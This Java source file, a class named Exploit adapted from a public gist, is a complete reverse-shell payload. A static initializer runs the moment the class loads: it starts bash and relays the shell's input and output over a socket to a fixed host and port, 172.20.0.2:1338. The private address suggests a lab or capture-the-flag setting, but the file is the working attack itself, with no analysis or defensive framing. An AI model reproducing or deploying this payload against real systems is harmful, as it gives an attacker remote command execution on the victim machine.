/**
 * Adjusted from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 */
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit extends Thread {
	private static final String SHELL = "bash";
	private static final String HOST = "172.20.0.2";
	private static final int PORT = 1338;

	@Override
	public void run() {
		try {
			System.out.println(HOST + ":" + PORT + "/" + SHELL);
			Process p = new ProcessBuilder(SHELL).redirectErrorStream(true).start();
			Socket s = new Socket(HOST, PORT);
			InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
			OutputStream po = p.getOutputStream(), so = s.getOutputStream();
			while (!s.isClosed()) {
				while (pi.available() > 0) so.write(pi.read());
				while (pe.available() > 0) so.write(pe.read());
				while (si.available() > 0) po.write(si.read());
				so.flush();
				po.flush();
				Thread.sleep(50);
				try {
					p.exitValue();
					break;
				} catch (Exception e) {
				}
			}
			;
			p.destroy();
			s.close();
		} catch (Exception ignored) {
		}
	}

	static {
		System.out.println("Exploited!");
		new Exploit().start();
	}
}
